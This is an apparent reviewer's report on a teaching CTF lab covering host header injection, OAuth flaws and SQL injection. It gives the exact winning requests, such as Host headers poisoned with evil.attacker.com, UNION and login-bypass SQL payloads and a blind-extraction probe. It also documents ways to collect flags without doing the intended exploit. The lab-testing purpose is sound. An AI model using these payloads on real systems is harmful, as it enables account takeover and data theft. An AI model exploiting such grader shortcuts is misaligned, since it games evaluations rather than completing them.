# Student Review: Rootkit Ray (ctf-06)
- Modules tested: hostheader (5/5 captured), oauth (8/8 captured), sqli (11/11 captured). All 24 flags re-verified live on the shared pool instance after the second VM reboot (~02:47 UTC); final scoreboard for my session read 24/201 with Host Header Injection 5/5, OAuth Flaws 8/8, SQL Injection 11/11. Time to first flag per module: hostheader under 1 minute, oauth under 2 minutes (including reading the public JS bundle), sqli about 1 second (the UNION win is instant).
- What worked well:
  - Every intended technique works exactly as briefed, first try, with plain HTTP requests. Winning requests (all sent with my unique cookie jar unless noted):
    - host-abs-url: POST /hostheader/login with header `Host: evil.attacker.com` and alice / alice123. Response is a 302 with `Location: http://evil.attacker.com/hostheader/dashboard` and the lab awarded the flag in the same response body.
    - host-reset-poison: POST /hostheader/forgot with `Host: evil.attacker.com`, then GET /hostheader/evil-collect?token=<issued token>. The lab awarded the flag.
    - host-xforwarded: POST /hostheader/forgot-xfwd with `X-Forwarded-Host: evil.attacker.com`, then GET /hostheader/evil-collect?token=<issued token>. The lab awarded the flag.
    - host-cache-poison: GET /hostheader/app/clear, then GET /hostheader/app with `Host: evil.attacker.com` (plants the poisoned copy), then GET /hostheader/app with the normal host. The lab awarded the flag on the second, normal visit.
    - host-ssrf: GET /hostheader/status with `Host: 127.0.0.1:13919`. The server fetched the loopback-only agent and the lab awarded the flag.
    - secret-in-js: GET /oauth/client/app.js, read the shipped client secret, approve a pentrix-client code as bob, then POST /oauth/idp/token directly with client_id, the stolen secret and the code. The lab awarded the flag in the JSON response.
    - code-leak: GET /oauth/idp/log (readable without any login), copy alice's issued pentrix-spa code from a log line, then POST /oauth/idp/token as bob with that code. The lab awarded the flag.
    - code-replay: approve a code as alice, POST /oauth/idp/token twice with the same code. First exchange: token only, no flag. Second exchange: the lab awarded the flag.
    - pkce-skip: approve with a code_challenge (S256), then POST /oauth/idp/token with no code_verifier at all. The lab awarded the flag.
    - redirect-bypass: POST /oauth/idp/approve with redirect_uri=http://app.pentrix.lab.evil.com/cb. The lab awarded the flag right on the approval page.
    - implicit: run the implicit flow as alice, POST the callback URL (fragment included) to /oauth/client/history-log, read /oauth/client/history as bob, then GET /oauth/idp/userinfo?access_token=<alice's token>. The lab awarded the flag.
    - no-state: mint a code as bob, then, with the IdP session switched to alice, GET /oauth/client/callback?code=<bob's code>. The lab awarded the flag and the client session became bob.
    - scope-upgrade: approve as bob with scope=admin, exchange the code, then GET /oauth/idp/admin-data?access_token=<token>. The lab awarded the flag (granted_to: bob, a plain user).
    - union: GET /sqli/products?q=' UNION SELECT 1,secret,2,3 FROM users WHERE username='admin' -- - . The admin secret rendered in the results and the lab awarded the flag.
    - error: GET /sqli/detail?id=' . One stray quote, the lab awarded the flag.
    - login-bypass: POST /sqli/login with username=admin'-- - and any password. The lab awarded the flag.
    - limit-offset: GET /sqli/paged?limit=-1. The lab awarded the flag.
    - order-by: GET /sqli/sort?sort=(CASE WHEN (SELECT 1 FROM users WHERE username='admin') THEN price ELSE name END). The lab awarded the flag.
    - groupby-having: GET /sqli/stats?by=(SELECT secret FROM users WHERE username='admin'). The lab awarded the flag.
    - insert-inject: POST /sqli/feedback with name=pwn', (SELECT secret FROM users WHERE username='admin')) -- - and any message, then reload the feedback wall. The lab awarded the flag.
    - second-order: POST /sqli/register with username=evilbob, display_name=x' OR username='admin'-- - and a password, then GET /sqli/profile?u=evilbob. The lab awarded the flag.
    - union-filter-bypass: GET /sqli/shop with the same UNION payload as the union challenge but with UNION in uppercase. The lab awarded the flag.
    - blind and like-wildcard: POST the admin secret to /sqli/blind-submit and /sqli/wildcard/submit. The lab awarded the flag in both cases (see the shortcut note under Bugs).
  - Most award conditions are properly guarded (details in the cheat battery under Bugs). Replays inside one session just re-render the same flag, and the scoreboard counts each challenge once.
- Bugs found (with reproduction):
  - CHEAT-WORKS, host-cache-poison cross-user free flag: the poisoned page cache is shared by every visitor of the instance, not per session. Reproduction: in session A, GET /hostheader/app/clear, then GET /hostheader/app with `Host: evil.attacker.com`. Then open a brand new session (fresh cookie jar) and simply GET /hostheader/app with the normal host, doing no poisoning at all. The lab awarded the flag to the fresh session. On a shared pool, whoever visits after a poisoning gets the flag for free.
  - CHEAT-WORKS, host-ssrf content-only check: the award only checks that the server-side fetched body contains the expected internal marker text; it does not check that the real internal agent answered. Reproduction: serve a static file at /hostheader/internal/metrics containing the marker string from any local HTTP server on 127.0.0.1 (I used python3 -m http.server on port 18777), then GET /hostheader/status with `Host: 127.0.0.1:18777`. The lab awarded the flag and the real internal agent was never contacted. It still needs Host control, so it is a partial shortcut, but the intended target is never verified.
  - CHEAT-WORKS, groupby-having literal echo: GET /sqli/stats?by='<admin secret>' (the secret as a quoted constant string, learned from any other challenge) returns the secret as the group key and the lab awarded the flag. No GROUP BY injection is performed. Reproduction works with any previously extracted admin secret; the unquoted version errors and awards nothing.
  - SHORTCUT, blind and like-wildcard submit boxes accept a secret obtained anywhere: both challenges only compare the submitted value to the admin secret. One UNION extraction (the union challenge) unlocks both submit boxes with zero blind requests. I verified the genuine oracles do work (blind: id=1' AND (SELECT substr(secret,1,1) FROM users WHERE username='admin')='P' -- - returns "Product exists.", the same probe with 'Z' returns "Not found."; like-wildcard: a true LIKE probe on the secret returned 4 matching products, a false one returned 0), so the intended path is functional, just optional.
  - DESIGN HOLE, host-xforwarded fallback: the reset link builder falls back from X-Forwarded-Host to X-Host-Override to plain Host. Reproduction: POST /hostheader/forgot-xfwd with only `Host: evil.attacker.com` poisoned (no forwarded header at all), then visit the collector with the issued token. The lab awarded the flag, so the proxy-header lesson of this challenge can be skipped by reusing the previous challenge's technique.
  - BLOCKED cheats (the guards work, recorded for completeness): host-abs-url with a normal Host (302 but no flag), with bad credentials (401, no flag), or with only X-Forwarded-Host set (no flag). evil-collect with no token, a random token, or a token issued under the normal host: no flag in all cases. GET /hostheader/internal/metrics directly on the public app returns only the boring public metrics, no flag. OAuth: exchanging with a code_verifier present earns no pkce-skip flag; the exact trusted redirect_uri earns no redirect-bypass flag and a foreign URI without the trusted prefix is rejected outright; presenting your own implicit token, or someone else's code-flow token, at /oauth/idp/userinfo earns no implicit flag; hitting /oauth/client/callback with your own code earns no no-state flag; an admin presenting their own admin-scoped token at /oauth/idp/admin-data earns no scope-upgrade flag. SQLi: limit=2--x (a no-op suffix that changes nothing) earns no limit-offset flag; smuggling the words "case when" and "users" inside a string literal in the sort parameter earns no order-by flag (literals are stripped before the check); the lowercase word union in the filtered shop is stripped and earns nothing; registering in second-order with display_name=admin and no quote shows the admin account on the profile page but earns no flag (the quote requirement holds).
  - Minor data mismatch: the admin password seeded in the source did not log in on the live instance (the login form answered "Invalid"), so the "legit admin login earns no flag" guard could not be confirmed end to end live. The injection path itself works as designed.
  - Infrastructure note: the pool VM rebooted twice during this review and wiped per-boot state both times. Every result above was re-run and re-confirmed after the second reboot (~02:47 UTC), finishing at scoreboard 24/201 for my session.
- Friction/confusion points:
  - curl testers beware: when a request carries an overridden Host header, curl files and sends the session cookie under that hostname, so host-abs-url's award lands in a different cookie entry than the scoreboard reads. My scoreboard sat at 23/201 with host-abs-url "missing" even though the response showed the flag, until I sent the session cookie explicitly. This is a curl artifact, not a lab bug (a browser files the cookie under the real origin), but any student testing with curl and a shared jar will hit it.
  - Challenge pages re-render the "Flag captured" banner when you replay a winning request, which can mislead you into thinking the scoreboard moved. The scoreboard is the only source of truth.
  - code-leak: the log page lists codes newest first and mixes clients. Grabbing the first `code=` match gets your own pentrix-client code from an earlier step, and exchanging it as pentrix-spa fails with "invalid or expired code". You have to pick the code from a pentrix-spa log line.
  - second-order: registration silently fails with a generic 400 if the password field is omitted. The form shows it, but a Repeater-first student who trims the request has to rediscover it.
  - pkce-skip: presenting any code_verifier value avoids the flag, and the verifier is never actually checked against the challenge. Correct behavior for the flag, but a student can "verify" a wrong verifier and see a successful exchange, which muddies the lesson slightly.
- Hint quality (helpful? spoilery? useless?): Helpful and well layered. The briefs name the exact parameter and mechanism without giving the payload, and the hint ladders escalate from "where to look" to a near-complete walkthrough. For a CTF player they are spoilery: the final hints and the copyable Repeater payload blocks are effectively the solution (host-ssrf's last hint names the exact header value to set). That is fine for a teaching lab, but anyone racing for time can ignore the challenge pages and just read hint 3.
- Difficulty fairness: Mostly fair. Easy challenges (error, secret-in-js, scope-upgrade, host-abs-url) fall in one or two requests, as they should. The two Medium submit-box challenges (blind, like-wildcard) are the only genuinely slow ones if done honestly (character-by-character extraction), yet the cross-challenge secret shortcut drops them to Easy, which undercuts their rating. host-cache-poison is labeled Hard but is two requests once you understand poison-then-visit; the Hard part is the concept, not the execution. second-order at Hard is fair: two steps, a storage delay, and a payload that has to survive registration.
- Burp-first feasibility: Fully feasible with Burp Community. Everything in this review was plain HTTP with curl, and each request maps one-to-one onto Repeater: header edits (Host, X-Forwarded-Host), form posts, and query edits. No Intruder-only or Pro-only feature is needed. The one browser-flavored step is implicit: in Burp's browser you visit the implicit callback page and the history records itself, while with curl I had to POST to /oauth/client/history-log by hand. Browser-first students actually have the smoother path there.
- Suggestions (concrete):
  - host-cache-poison: scope the demo cache per session (or auto-expire the poisoned entry after the poisoning session's next request) so a bystander session cannot collect the flag for free on a shared instance.
  - host-ssrf: award only when the fetched body matches the internal agent's full expected response shape (for example its service name plus the marker), or bind the check to the agent's actual port, so a stand-in server returning the marker string is not enough.
  - groupby-having: reject grouping expressions that are bare string literals (no column, function, or subquery), or require the returned key to come from a subquery against the users data rather than a constant.
  - blind and like-wildcard: give each submit box a per-challenge target (for example, the secret of a different account per challenge) so one UNION extraction cannot unlock all three challenges at once.
  - host-xforwarded: drop the plain Host fallback (keep X-Forwarded-Host, then X-Host-Override only) so the challenge cannot be solved with the previous challenge's Host poisoning.
  - Add a "captured" state check on each challenge page that reads the same source as the scoreboard, so students do not have to cross-check the scoreboard after every replay.
  - Fix the seeded admin credentials mismatch between source and the live pool image, or remove the password from the source, so the legit-login path can be tested as documented.
- Rating: 4
